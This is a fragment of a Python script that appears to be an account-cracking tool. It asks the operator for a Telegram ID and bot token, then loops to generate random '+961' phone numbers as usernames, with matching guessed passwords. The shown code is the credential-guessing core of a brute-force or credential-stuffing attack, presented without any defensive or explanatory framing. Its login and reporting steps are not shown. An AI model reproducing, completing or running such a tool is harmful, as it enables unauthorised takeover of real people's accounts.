...
print(BGreen+lo*34)
print(' ')                               
myadmin = input("  "+BYellow+"- id telegram ☠️ : ")
tele = input("  "+BYellow+"- Bot Token ☠️  :  ")
os.system('clear')
print("""
   """+BRed+"""        
"""+BGreen+"""          
...
while True:
    chars = '333975'
    u = '3'
    u1 = str("". join(random.choice(chars)for i in range(6)))
    u2 = str("". join(random.choice(u)for i in range(3)))
    user = '+9610'+u+u1
    pasw = '0'+u+u1
